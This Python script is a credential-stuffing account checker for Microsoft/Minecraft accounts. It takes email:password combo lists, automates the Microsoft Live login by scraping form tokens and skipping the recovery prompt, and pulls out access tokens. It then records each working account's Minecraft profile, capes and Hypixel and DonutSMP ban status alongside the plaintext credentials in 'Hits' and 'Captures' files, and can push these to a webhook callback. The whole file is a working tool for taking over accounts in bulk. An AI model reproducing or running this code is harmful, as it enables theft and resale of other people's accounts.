import os, time, re, json, socket, random, urllib3, warnings, uuid, threading, sys, subprocess
from datetime import datetime, timezone
from urllib.parse import urlparse, parse_qs
import requests

import minecraft
from minecraft import Version, initglobals
from minecraft.networking.connection import Connection
from minecraft.authentication import AuthenticationToken, Profile
from minecraft.networking.packets import clientbound, serverbound
from minecraft.networking.packets.serverbound.login import LoginStartPacket
from minecraft.networking.types import String, UUID

urllib3.disable_warnings()
warnings.filterwarnings("ignore")

if not any(v.protocol == 764 for v in minecraft.KNOWN_MINECRAFT_VERSION_RECORDS):
    minecraft.KNOWN_MINECRAFT_VERSION_RECORDS.extend([
        Version('1.20.2', 764, True),
    ])
    initglobals(use_known_records=True)

def login_start_write_fields(self, packet_buffer):
    String.send(self.name, packet_buffer)
    if self.context.protocol_later_eq(764):
        val = getattr(self, 'player_uuid', None)
        if val is None: val = uuid.uuid4()
        UUID.send(str(val), packet_buffer)
LoginStartPacket.write_fields = login_start_write_fields

sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"

def get_urlPost_sFTTag(session):
    for _ in range(3):
        try:
            text = session.get(sFTTag_url, timeout=15).text
            match = re.search(r'value=\\?"(.+?)\\?"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
            if match:
                sFTTag = match.group(1)
                match2 = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                if match2:
                    return match2.group(1), sFTTag, session
        except:
            pass
        time.sleep(1)
    return None, None, session

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    try:
        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
        login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
        
        if '#' in login_request.url and login_request.url != sFTTag_url:
            token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
            if token != "None": return token, session
                
        elif 'cancel?mkt=' in login_request.text:
            ipt = re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group()
            pprid = re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group()
            uaid = re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
            ret = session.post(re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group(), data={'ipt': ipt, 'pprid': pprid, 'uaid': uaid}, allow_redirects=True)
            fin = session.get(re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group(), allow_redirects=True)
            token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
            if token != "None": return token, session
    except:
        pass
    return "None", session

def check_hypixel_via_go(username, uuid_str, access_token):
    stats = {"status": "Unbanned", "reason": "None"}
    try:
        binary_path = "./hypixel_stats"
        if not os.path.exists(binary_path):
            binary_path = "hypixel_stats.exe"
        if not os.path.exists(binary_path):
            return stats

        result = subprocess.run(
            [binary_path, username, uuid_str, access_token],
            capture_output=True,
            text=True,
            timeout=15
        )
        if result.returncode == 0 and result.stdout.strip():
            data = json.loads(result.stdout.strip())
            if "status" in data:
                stats["status"] = data.get("status", "Unbanned")
                stats["reason"] = data.get("reason", "None")
    except Exception:
        pass
    return stats

def check_donutsmp_status(mc_name, mc_uuid, mc_token):
    result = None
    disconnect_message = None
    donut_data = {"status": "Unbanned", "reason": "None"}
    
    auth_token = AuthenticationToken(username=mc_name, access_token=mc_token, client_token=uuid.uuid4().hex)
    auth_token.profile = Profile(id_=mc_uuid, name=mc_name)
    
    try:
        connection = Connection("donutsmp.net", 25565, auth_token=auth_token, initial_version=764, allowed_versions={764})

        @connection.listener(clientbound.login.DisconnectPacket, early=True)
        def login_disconnect(packet):
            nonlocal result, disconnect_message
            try: msg = str(packet.json_data)
            except: msg = ""
            disconnect_message = msg
            result = "banned"

        @connection.listener(clientbound.play.JoinGamePacket, early=True)
        def joined_server(packet):
            nonlocal result
            result = "unbanned"

        connection._connect()
        connection._handshake(next_state=2)
        
        login_start = serverbound.login.LoginStartPacket()
        login_start.name = mc_name
        login_start.player_uuid = mc_uuid
        connection.write_packet(login_start)
        
        from minecraft.networking.connection import LoginReactor
        connection.reactor = LoginReactor(connection)
        connection._start_network_thread()

        c = 0
        while result is None and c < 1200:
            time.sleep(0.01)
            c += 1
            
        try: connection.disconnect()
        except: pass

        if result == "banned" and disconnect_message:
            donut_data["status"] = "Banned"
            text_parts = re.findall(r'"text"\s*:\s*"([^"]+)"', disconnect_message)
            if text_parts:
                full_text = ' '.join(text_parts)
                donut_data["reason"] = full_text[:150]
    except:
        pass
    return donut_data

def run(input_path, output_path, hit_callback=None):
    res_dir = os.path.dirname(output_path)
    os.makedirs(res_dir, exist_ok=True)
    
    if not os.path.exists(input_path): return

    with open(input_path, 'r', encoding='utf-8', errors='replace') as f:
        lines = [line.strip() for line in f if line.strip()]

    hits_list, bad_list, capture_list = [], [], []

    for line in lines:
        if ":" not in line: continue
        email, password = line.strip().split(":", 1)
        
        session = requests.Session()
        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
        if not urlPost or not sFTTag:
            bad_list.append(line)
            continue
        
        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
        if token == "None":
            bad_list.append(line)
            continue
        
        hits_list.append(line)
        name = "Minecraft Account"
        player_uuid = ""
        cape_list = "None"
        hypixel_stats = {"status": "Unbanned", "reason": "None"}
        donut_info = {"status": "Unbanned", "reason": "None"}

        try:
            r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {token}'}, verify=False, timeout=5)
            if r.status_code == 200:
                data = r.json()
                name = data.get("name", "Minecraft Account")
                player_uuid = data.get("id", "")
                found_capes = [c.get("alias", "") for c in data.get("capes", [])]
                if found_capes: cape_list = ", ".join(found_capes)
                
                if player_uuid:
                    hypixel_stats = check_hypixel_via_go(name, player_uuid, token)
                    donut_info = check_donutsmp_status(name, player_uuid, token)
        except:
            pass
        
        cap_block = (
            f"Email: {email}\nPassword: {password}\nName: {name}\nUUID: {player_uuid}\n"
            f"Capes: {cape_list}\nHypixel Status: {hypixel_stats['status']} | Reason: {hypixel_stats['reason']}\n"
            f"DonutSMP Status: {donut_info['status']} | Reason: {donut_info['reason']}\n============================\n"
        )
        capture_list.append(cap_block)

        # Trigger Flask Webhook Callback properly
        if hit_callback:
            try:
                hit_callback(
                    email=email, password=password, account_type="Minecraft Java",
                    capes=cape_list, hypixel_rank=hypixel_stats['status'],
                    hypixel_level=hypixel_stats['reason'], donut_status=donut_info['status'],
                    donut_reason=donut_info['reason']
                )
            except:
                pass

    with open(os.path.join(res_dir, "Hits.txt"), 'w', encoding='utf-8') as h_file:
        h_file.write("\n".join(hits_list) + ("\n" if hits_list else ""))

    final_output = ["=== HITS [+] ===\n"] + [f"{h}\n" for h in hits_list] + ["\n=== BAD [-] ===\n"] + [f"{b}\n" for b in bad_list] + ["\n=== CAPTURES ===\n"] + capture_list
    with open(output_path, 'w', encoding='utf-8', errors='replace') as out:
        out.writelines(final_output)

    final_output = ["=== HITS [+] ===\n"] + [f"{h}\n" for h in hits_list] + ["\n=== BAD [-] ===\n"] + [f"{b}\n" for b in bad_list] + ["\n=== CAPTURES ===\n"] + capture_list
    with open(output_path, 'w', encoding='utf-8', errors='replace') as out:
        out.writelines(final_output)
